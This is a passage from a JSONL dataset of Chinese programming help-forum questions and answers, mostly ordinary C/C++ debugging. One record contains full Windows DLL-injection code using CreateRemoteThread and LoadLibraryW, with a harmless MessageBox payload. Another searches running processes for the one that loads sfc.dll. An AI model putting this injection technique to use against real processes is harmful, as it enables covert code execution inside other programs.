没有任何效果", "请问代码的问题具体在哪里？", "下面是代码", "\n", "//InjectDll.cpp", "\n", "#", "include", " ", "\"tchar.h\"", "\n", "#", "include", " ", "<windows.h>", "\n", "#", "include", " ", "<stdio.h>", "\n", "BOOL", " InjectDll(DWORD dwPID, LPCTSTR szDllPath)\n{\n    HANDLE hProcess = ", "NULL", ", hTread = ", "NULL", ";\n    HMODULE hMod = ", "NULL", ";", "//DLL模块", "\n    LPVOID pRemoteBuf = ", "NULL", ";", "//插入字符串的缓冲区", "\n    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + ", "1", ") * ", "sizeof", "(TCHAR);", "//DLL路径字符串大小长度", "\n    LPTHREAD_START_ROUTINE pThreadProc;", "//定义函数指针", "\n    ", "//使用dwPID获取目标进程(notepad.exe)句柄", "\n    ", "if", " (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, ", "FALSE", ", dwPID)))\n    {\n        _tprintf(TEXT(", "\"OpenProcess(%d) failed [%d]\\n\"", "), dwPID, GetLastError());\n        ", "return", " ", "FALSE", ";\n    }\n    ", "//在目标进程(notepad.exe)内存中分配szDllName大小的内存", "\n    pRemoteBuf = VirtualAllocEx(hProcess, ", "NULL", ", dwBufSize, MEM_COMMIT, PAGE_READWRITE);\n    ", "//将myhack.dll路径写入分配的内存", "\n    ", "if", " (pRemoteBuf == ", "NULL", ")\n        ", "return", " ", "FALSE", ";\n    ", "//将DLL路径字符串写入内存地址", "\n    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, ", "NULL", ");\n    ", "//获取LoadLibraryW() API的地址", "\n    hMod = GetModuleHandleW(L", "\"kernel.dll\"", ");\n    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, ", "\"LoadLibraryW\"", ");\n    ", "//在notepad.exe进程中运行线程", "\n    HANDLE hThread = CreateRemoteThread(\n        hProcess, ", "NULL", ", ", "0", ", pThreadProc, pRemoteBuf, ", "0", ", ", "NULL", "\n    );\n    ", "if", " (hThread == ", "NULL", ")\n        ", "return", " ", "FALSE", ";\n    WaitForSingleObject(hThread, INFINITE);\n    VirtualFreeEx(hProcess, pRemoteBuf, dwBufSize, MEM_FREE);\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n    ", "return", " ", "TRUE", ";\n}\n\n", "int", " _tmain(", "int", " argc, TCHAR *argv[])\n{\n    ", "if", " (argc != ", "3", ")\n    {\n        _tprintf(TEXT(", "\"USAGE ：%s pid dll_path\\n\"", "), argv[", "0", "]);\n        ", "return", " ", "1", ";\n    }\n    ", "//inject DLL", "\n    ", "if", " (InjectDll((DWORD)_tstol(argv[", "1", "]), argv[", "2", "]))\n        wprintf(L", "\"InjectDll(%hs) success\\n\"", ", argv[", "2", "]);\n    ", "else", "\n        wprintf(L", "\"InjectDll(%hs) failed\\n\"", ", argv[", "2", "]);\n    ", "return", " ", "0", ";\n}\n\n", "//myhack.cpp 会生成一个DLL文件 用来注入", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "\"windows.h\"", "\n", "#", "include", " ", "\"tchar.h\"", "\n", "#", "include", " ", "<stdio.h>", "\n\nHMODULE g_hMod = ", "NULL", ";\nDWORD WINAPI ThreadProc(LPVOID lParam)\n{\n    MessageBox(", "NULL", ", TEXT(", "\"DLL injection SUCCESS\"", "), TEXT(", "\"HaHa\"", "), MB_OK);\n    ", "return", " ", "0", ";\n}\n", "BOOL", " WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n{\n    HANDLE hThread = ", "NULL", ";\n    g_hMod = (HMODULE)hinstDLL;\n    ", "switch", " (fdwReason)\n    {\n    ", "case", " DLL_PROCESS_ATTACH:\n        OutputDebugString(", "\"Myhack.dll Injection\\n\"", ");", "//输出字符串", "\n        hThread = CreateThread(", "NULL", ", ", "0", ", ThreadProc, ", "NULL", ", ", "0", ", ", "NULL", ");\n        CloseHandle(hThread);\n        ", "break", ";\n    }\n    ", "return", " ", "TRUE", ";\n}\n"]], "Tag": "程序设计"}
{"Answer": "void init (QNode **s, LQueue **L)\r\n\r\n*s =malloc(....)\r\n*L = .......\r\n\r\n参数有问题", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["预习数据结构用C语言写链队出现的一个小问题，可能关于指针", ["可以编译，但是没有办法运行", "\n用vs调试，我猜测问题出现在指针初始化上面", "\n（init 函数）", "\n\n", " #include<stdio.h> \n#include<malloc.h>\n\ntypedef struct  node\n{  struct  node *next;\n    int data;\n} QNode;\n\n//\n\ntypedef struct aaa\n{  QNode *front;\n   QNode *rear;   //指针指向 QNode 类型 \n}LQueue;\n\n// 初始化\nvoid init (QNode *s,LQueue *L)\n{   s= (struct  node* )malloc(  sizeof(struct  node));\n    L= (LQueue* )malloc(  sizeof(LQueue));\n     s->next=NULL;\n     L->front=L->rear=(struct  node* )malloc(  sizeof(struct  node)) ;\n     L->front=L->rear= s;\n\n\n } \n //入队\n void push (LQueue *l,int x)\n{   QNode *q=NULL;\n   q= (struct  node* )malloc(  sizeof(struct  node));\n     q->data=x;  q->next=NULL;           \n   l->rear->next=q;\n    l->rear = q;\n\n }  \n\n QNode *pop (QNode *p,LQueue *L,int *x)\n {   QNode *s=NULL; \n      s=L->front;\n     L->front=L->front->next;\n      *x = s->data;\n      free(s);\n }\n\n //测试\n int main(void)\n {  int x=1;int *x1=NULL;\n  QNode *a = NULL;\n  LQueue *b =NULL;\n  init (a,b);\n  push( b ,x);\n // printf(\"%d\",L->rear->data);\n\n }\n\n"]], "Tag": "程序设计"}
{"Answer": "基础太差了  单独写成函数是循环来调用，遇到pid=0的虽然失败 但循环下一个， 合写在一个主函数的时候没仔细看代码  直接把上面的return 给挪下来了，这就出现了id写成aProcesses[i] 会失败返回 写成aProcesses[i+1]就跳过pid=0了。或者把return 换成continue就ok了", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请大家帮我看看两段代码的区别真想不明白了", ["有两段代码 代码一是单独写成函数来调用的， 我把他们合成一个主函数的代码 就出错  好像是变量递增的问题，我怎么也想不通，麻烦大家了。", "\n\n", "代码一  别人写的：", "\n#include ", "\n#include ", "\n#include ", "\n#include ", "\n#pragma comment(lib,\"Psapi.lib\")", "\n\n", "int FindModules( DWORD processID )", "\n{", "\n    HMODULE hMods[1024];", "\n    HANDLE hProcess;", "\n    DWORD cbNeeded;", "\n    unsigned int i;", "\n\n", "    // Get a handle to the process.", "\n    hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID );", "\n    if (NULL == hProcess) return 1;", "\n\n", "   // Get a list of all the modules in this process.", "\n    if( EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))", "\n    {", "\n        for ( i = 0; i < (cbNeeded / sizeof(HMODULE)); i++ )", "\n        {", "\n            TCHAR szModName[MAX_PATH];", "\n            if (GetModuleBaseName(hProcess, hMods[i], szModName,sizeof(szModName) / sizeof(TCHAR)))", "\n            {", "\n                if(strcmp(szModName,\"sfc.dll\")==0) ", "\n                {", "\n                    printf(\"%s  PID:%d\\n\",szModName,processID);", "\n                    break;", "\n                }", "\n            }", "\n        }", "\n    }", "\n    CloseHandle( hProcess );", "\n    return 0;", "\n}", "\n\n", "int main( void )", "\n{", "\n    DWORD aProcesses[1024]; ", "\n    DWORD cbNeeded; ", "\n    unsigned int i;", "\n\n", "    // Get the list of process identifiers.", "\n    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) ) return 1;", "\n\n", "    // Print the names of the modules for each process.", "\n    for ( i = 0; i < cbNeeded / sizeof(DWORD); i++ )", "\n    {", "\n        FindModules( aProcesses[i] );", "\n    }", "\n\n", "    return 0;", "\n}", "\n\n", "代码2：我想合到一个函数中：", "\n\n", "#include ", "\n#include ", "\n#include ", "\n#pragma comment(lib,\"Psapi.lib\")", "\n\n", "int main( void )", "\n{", "\n    DWORD aProcesses[1024]; ", "\n    DWORD cbNeeded; ", "\n    unsigned int i;", "\n\n", "HMODULE hMods[1024];\nHANDLE hProcess;\nDWORD cbNeeded2;\nunsigned int ii;\n", "\n\n", "    // Get the list of process identifiers.", "\n    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) ) return 1;", "\n\n", "    // Print the names of the modules for each process.", "\n    for ( i = 0; i < cbNeeded / sizeof(DWORD); i++ )", "\n    {", "\n        // 错误下面这句，分开些函数就没问题 i都等于0，写在一个函数里 就不行了，就返回2，必须把i加1，跳过过pid为0才行.", "\n        hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i+1] );//我直接用aProcesses[i]怎么不行啊？", "\n        if (NULL == hProcess) return 2;", "\n\n", "   // Get a list of all the modules in this process.\n    if( EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded2))\n    {\n        for ( ii = 0; ii < (cbNeeded2 / sizeof(HMODULE)); ii++ )\n        {\n            TCHAR szModName[MAX_PATH];\n            if (GetModuleBaseName(hProcess, hMods[ii], szModName,sizeof(szModName) / sizeof(TCHAR)))\n            {\n                if(strcmp(szModName,\"sfc.dll\")==0) \n                {\n                    printf(\"%s  PID:%d\\n\",szModName,aProcesses[i+1]);\n                    break;\n                }\n            }\n        }\n        CloseHandle( hProcess );\n    }\n}\n", "\n\n", "    return 0;", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你用fprintf写文件&amp;#xff0c;读文件就要用fscanf读&amp;#xff0c;fread在读取的时候&amp;#xff0c;会出现字节序颠倒的问题&amp;#xff0c;也就是说&amp;#xff0c;fread在读取数据的时候&amp;#xff0c;是按照低位在前&amp;#xff0c;高位在后的字节顺序读取数据&amp;#xff0c;而且&amp;#xff0c;读取的数据是字符&amp;#xff0c;然后再转成double类型。但是fprintf在写文件的时候&amp;#xff0c;直接是把数字转成相应的字符了。举个简单的例子&amp;#xff0c;数字53用fprintf写文件&amp;#xff0c;文件中的内容就是53&amp;#xff0c;但是fread在读取的时候&amp;#xff0c;会把53作为一个字符(53好像是字符&amp;#39;5&amp;#39;的ascii码)读进来&amp;#xff0c;这样就会出现错误&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用fprintf写入后用fread读取都是0 （double型）", ["\n", "/*    从键盘输入10个double型，将其写入文件，然后用fread读取输出至数组。 \n*/", "\n", "#", "include", "<stdio.h>", "\n\n", "int", " ", "main", "()", "\n", "{\n    FILE *fp;\n    ", "double", " no;\n    ", "int", " i=", "0", ";\n    ", "if", "( (fp=", "fopen", "(", "\"数组double.bin\"", ",", "\"wb\"", "))==", "NULL", " )\n        ", "printf", "(", "\"打开文件失败。\\n\"", ");\n    ", "else", "\n    {\n        ", "puts", "(", "\"输入10个double:\"", ");\n        ", "while", "(    i<", "10", "    )\n        {\n            ", "printf", "(", "\"输入第%d个数：\"", ",i+", "1", ");\n            ", "scanf", "(", "\"%lf\"", ",&no);     \n            ", "fprintf", "(fp,", "\"%lf\\n\"", ",no);\n            i++; \n        }\n        ", "fclose", "(fp);\n    }\n \n", "//下面 进行读取。 ", "\n    ", "double", " zu[", "10", "];\n    ", "if", "(    (fp=", "fopen", "(", "\"数组double.bin\"", ",", "\"rb\"", "))==", "NULL", "    )\n        ", "printf", "(", "\"打开文件失败。\\n\"", ");\n    ", "else", "\n    {\n        ", "fread", "(zu,", "sizeof", "(", "double", "),", "10", ",fp) ;", "//读取结束，下面显示。 ", "\n        ", "for", "(i=", "0", ";i<", "10", ";i++)\n            ", "printf", "(", "\"zu[%d]:%lf\\n\"", ",i+", "1", ",zu[i]);\n        ", "fclose", "(fp);\n    }\n    \n    ", "return", " ", "0", ";\n}\n", "\n", "\n", "下面是输出结果：", "输入10个double:", "输入第1个数：123.1", "输入第2个数：123.2", "输入第3个数：123.3", "输入第4个数：123.4", "输入第5个数：123.5", "输入第6个数：456.77", "输入第7个数：456.888", "输入第8个数：99.100", "输入第9个数：60.111", "输入第10个数：100.112", "\n", "zu", "[", "1", "]:", "0", ".", "000000", "\n", "zu", "[", "2", "]:", "0", ".", "000000", "\n", "zu", "[", "3", "]:", "0", ".", "000000", "\n", "zu", "[", "4", "]:", "0", ".", "000000", "\n", "zu", "[", "5", "]:", "0", ".", "000000", "\n", "zu", "[", "6", "]:", "0", ".", "000000", "\n", "zu", "[", "7", "]:", "0", ".", "000000", "\n", "zu", "[", "8", "]:", "0", ".", "000000", "\n", "zu", "[", "9", "]:", "0", ".", "000000", "\n", "zu", "[", "10", "]:", "0", ".", "000000", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt; vp1 !&amp;#61; v1.end()吧&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++ vector遍历容器报错问题", ["\n\n\n", "#", "include", "<iostream>", "\n", "#", "include", " ", "<cstring>", "\n", "#", "include", " ", "<vector>", "\n\n", "using", " ", "namespace", " std;\n\n", "typedef", " vector<", "int", "> V1;\n", "using", " V2 = vector<", "int", ">;\n\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " nums1[] = {", "1", ", ", "2", ", ", "3", ", ", "4", ", ", "5", ", ", "6", "};\n    ", "V1 ", "v1", "(nums1, nums1 + ", "sizeof", "(nums1) / ", "sizeof", "(", "int", "))", ";\n\n    ", "int", " nums2[] = {", "5", ", ", "6", ", ", "7", "}; \n    ", "V2 ", "v2", "(nums2, nums2 + ", "sizeof", "(nums2) / ", "sizeof", "(", "int", "))", ";\n\n    ", "for", " (", "auto", " i:v1)\n    {\n        cout<<i<<", "\" \"", ";\n    }\n    cout<<endl;\n\n    V1::iterator vp1;\n    ", "for", " (vp1 = v1.", "begin", "(); vp1 != vp1.", "end", "(); vp1++)  ", "//这里的vp1.end()会报错 ‘std::vector<int>::iterator’没有名为‘end’的成员", "\n    {\n        cout<<*vp1<<endl;\n    }\n\n    cout<<endl;\n    ", "//上述的的vp1.end()会报错 ‘std::vector<int>::iterator’没有名为‘end’的成员", "\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这段代码没发现问题&amp;#xff0c;是否是 malloc()函数的头文件缺了&amp;#xff0c;应该加上 #include &amp;lt;stdlib.h&amp;gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["我简单写了个测试，为什么数据传不进去", ["#include <stdio.h>", "struct ListNode {", "    int val;", "    struct ListNode* next;", "};", "\n", "int main()", "{", "    struct ListNode* n1 = (struct ListNode*)malloc(sizeof(struct ListNode));", "    struct ListNode* n2 = (struct ListNode*)malloc(sizeof(struct ListNode));", "    struct ListNode* n3 = (struct ListNode*)malloc(sizeof(struct ListNode));", "    struct ListNode* n4 = (struct ListNode*)malloc(sizeof(struct ListNode));", "    n1->val = 1;", "    n2->val = 2;", "    n3->val = 3;", "    n4->val = 4;", "    n1->next = n2;", "    n2->next = n3;", "    n3->next = n4;", "    n4->next = NULL;", "    struct ListNode* fast, * slow;", "    fast = slow = n1;", "    while (fast)", "    {", "        fast = fast->next->next;", "        slow = slow->next;", "    }", "    while (slow)", "    {", "        printf(\"%d\", slow->val);", "        slow = slow->next;", "    }", "\n", "return", " ", "0", ";\n", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;实现过程中传入的形参char* p读取到数据内容后并没能传递到实参上去&amp;#xff0c;那么Vfile函数中参数为空&amp;#xff0c;导致报错。&lt;br /&gt;改为内部创建内存&amp;#xff0c;传出数据外部使用和释放。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; _CRT_SECURE_NO_WARNINGS&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* &lt;span class=\"hljs-title\"&gt;Cfile&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;&amp;amp; n, &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* filename)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (filename &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    }\n    FILE* pf &amp;#61; &lt;span class=\"hljs-built_in\"&gt;fopen&lt;/span&gt;(filename, &lt;span class=\"hljs-string\"&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pf &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;perror&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;fopen&amp;#34;&lt;/span&gt;);\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* p &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;) * &lt;span class=\"hljs-number\"&gt;1024&lt;/span&gt;);\n    &lt;span class=\"hljs-comment\"&gt;//使用文件&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; temp &amp;#61; &lt;span class=\"hljs-number\"&gt;1024&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (&lt;span class=\"hljs-built_in\"&gt;fread&lt;/span&gt;(p &amp;#43; i, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;), &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, pf))\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (i &amp;#61;&amp;#61; temp&lt;span class=\"hljs-number\"&gt;-1&lt;/span&gt;)\n        {\n            &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* p1 &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;realloc&lt;/span&gt;(p, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;) * (temp &amp;#43; &lt;span class=\"hljs-number\"&gt;1024&lt;/span&gt;));\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (p1 !&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n            {\n                p &amp;#61; p1;\n                p1 &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n                temp &amp;#43;&amp;#61; &lt;span class=\"hljs-number\"&gt;1024&lt;/span&gt;;\n                &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;增容成功\\n&amp;#34;&lt;/span&gt;);\n            }\n            &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n            {\n                &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;增容失败\\n&amp;#34;&lt;/span&gt;);\n                &lt;span class=\"hljs-built_in\"&gt;perror&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;realloc&amp;#34;&lt;/span&gt;);\n                &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n            }\n        }\n \n        i&amp;#43;&amp;#43;;\n    }\n    &lt;span class=\"hljs-comment\"&gt;//关闭文件&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;fclose&lt;/span&gt;(pf);\n    pf &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    n &amp;#61; i;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; p;\n \n}\n \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Vfile&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* p, &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* filename,&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (p &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ;\n    }\n    FILE* pf &amp;#61; &lt;span class=\"hljs-built_in\"&gt;fopen&lt;/span&gt;(filename, &lt;span class=\"hljs-string\"&gt;&amp;#34;w&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pf &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;perror&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;fopen&amp;#34;&lt;/span&gt;);\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ;\n    }\n    &lt;span class=\"hljs-comment\"&gt;//使用文件&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i &amp;lt; n;i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;fwrite&lt;/span&gt;(p&amp;#43;i, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;), &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, pf);\n    }\n    &lt;span class=\"hljs-comment\"&gt;//关闭文件&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;fclose&lt;/span&gt;(pf);\n    pf &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n \n}\n \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; cfilename[] &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#34;C:\\\\Users\\\\zhizhu\\\\Desktop\\\\hello\\\\文件拷贝.txt&amp;#34;&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; vfilename[] &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#34;C:\\\\Users\\\\zhizhu\\\\Desktop\\\\hello\\\\文件拷贝2.txt&amp;#34;&lt;/span&gt;;\n    \n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* p &amp;#61; &lt;span class=\"hljs-built_in\"&gt;Cfile&lt;/span&gt;(n, cfilename);\n    &lt;span class=\"hljs-built_in\"&gt;Vfile&lt;/span&gt;(p, vfilename, n);\n    &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(p);\n    p &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n \n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["我想用开辟堆空间实现拷贝操作，但程序不知道错在哪", ["我想用开辟堆空间实现拷贝操作，但程序不知道错在哪", "\n", "#", "define", " _CRT_SECURE_NO_WARNINGS", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n\n", "int", " ", "Cfile", "(", "char", "* p, ", "char", "* filename)", "\n", "{\n    FILE* pf = ", "fopen", "(filename, ", "\"r\"", ");\n    ", "if", " (pf == ", "NULL", ")\n    {\n        ", "perror", "(", "\"fopen\"", ");\n        ", "return", " ", "-1", ";\n    }\n    ", "//使用文件", "\n    ", "int", " temp = ", "1024", ";\n    ", "int", " i = ", "0", ";\n    ", "while", " (", "fread", "(p + i, ", "sizeof", "(", "char", "), ", "1", ", pf))\n    {\n        ", "if", " (i == temp", "-1", ")\n        {\n            ", "char", "* p1 = (", "char", "*)", "realloc", "(p, ", "sizeof", "(", "char", ") * (temp + ", "1024", "));\n            ", "if", " (p1 != ", "NULL", ")\n            {\n                p = p1;\n                p1 = ", "NULL", ";\n                temp += ", "1024", ";\n                ", "printf", "(", "\"增容成功\\n\"", ");\n            }\n            ", "else", "\n            {\n                ", "printf", "(", "\"增容失败\\n\"", ");\n                ", "perror", "(", "\"realloc\"", ");\n                ", "return", " ", "-1", ";\n            }\n        }\n\n        i++;\n    }\n    ", "//关闭文件", "\n    ", "fclose", "(pf);\n    pf = ", "NULL", ";\n    ", "return", " i;\n\n}\n\n", "void", " ", "Vfile", "(", "char", "* p, ", "char", "* filename,", "int", " n)", "\n", "{\n    FILE* pf = ", "fopen", "(filename, ", "\"w\"", ");\n    ", "if", " (pf == ", "NULL", ")\n    {\n        ", "perror", "(", "\"fopen\"", ");\n        ", "return", " ", "-1", ";\n    }\n    ", "//使用文件", "\n    ", "for", " (", "int", " i = ", "0", ";i < n;i++)\n    {\n        ", "fwrite", "(p+i, ", "sizeof", "(", "char", "), ", "1", ", pf);\n    }\n    ", "//关闭文件", "\n    ", "fclose", "(pf);\n    pf = ", "NULL", ";\n\n}\n\n", "int", " ", "main", "()", "\n", "{\n    ", "char", " cfilename[] = ", "\"C:\\\\Users\\\\zhizhu\\\\Desktop\\\\hello\\\\文件拷贝.txt\"", ";\n    ", "char", " vfilename[] = ", "\"C:\\\\Users\\\\zhizhu\\\\Desktop\\\\hello\\\\文件拷贝2.txt\"", ";\n    ", "char", "* p = (", "char", "*)", "malloc", "(", "sizeof", "(", "char", ") * ", "1024", ");\n    ", "int", " n = ", "Cfile", "(p, cfilename);\n    ", "Vfile", "(p, vfilename, n);\n    ", "free", "(p);\n    p = ", "NULL", ";\n}\n\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;\n&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;\n//先声明函数\nint fun(int n);\n\nint main()\n{\n    int n;\n    printf(&amp;#34;请输入要输出多少项&amp;#xff08;自然数&amp;#xff09;斐波那契数列&amp;#xff1a;&amp;#34;);\n    scanf(&amp;#34;%d&amp;#34;,&amp;amp;n);\n    //int *a &amp;#61; (int *)malloc((n&amp;#43;1)*sizeof(int));//如需存储&amp;#xff0c;使用动态内存分配n&amp;#43;1个空间进行存储\n    int i;\n    for (i &amp;#61; 0; i &amp;lt; n&amp;#43;1; i&amp;#43;&amp;#43;)         //输出所有项\n    {\n        printf(&amp;#34;%d, &amp;#34;, fun(i));\n        if (i !&amp;#61; 0 &amp;amp;&amp;amp; i%5 &amp;#61;&amp;#61; 0)     //每五项进行一次换行&amp;#xff08;第一行多一个第0项&amp;#xff09;\n            printf(&amp;#34;\\n&amp;#34;);\n    }\n    printf(&amp;#34;第 %d 项是&amp;#xff1a;%d\\n&amp;#34;, n, fun(n)); //输出要求的项\n    return 0;\n}\n\nint fun(int n)      //n代表第几项。特别指出&amp;#xff1a;0是第0项&amp;#xff0c;不是第1项。\n{\n    if (n &amp;lt;&amp;#61; 1)\n        return n;\n    else\n        return fun(n-1) &amp;#43; fun(n-2);\n}\n \n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt; &lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["使用C语言用递归法求斐波那契数列，（套用函数）", ["不知道怎么编写函数", "\n\n", "#include<stdio.h>", "\nint fun(int n)      //n代表第几项。特别指出：0是第0项，不是第1项。", "\n{", "\n    if (n <= 1)", "\n        return n;", "\n    else", "\n        return fun(n-1) + fun(n-2);", "\n}", "\n ", "\n", "int main()", "\n{", "\n    int n;", "\n    printf(\"请输入要输出多少项（自然数）斐波那契数列：\");", "\n    scanf(\"%d\",&n);", "\n    //int *a = (int *)malloc((n+1)*sizeof(int));//如需存储，使用动态内存分配n+1个空间进行存储", "\n    int i;", "\n    for (i = 0; i < 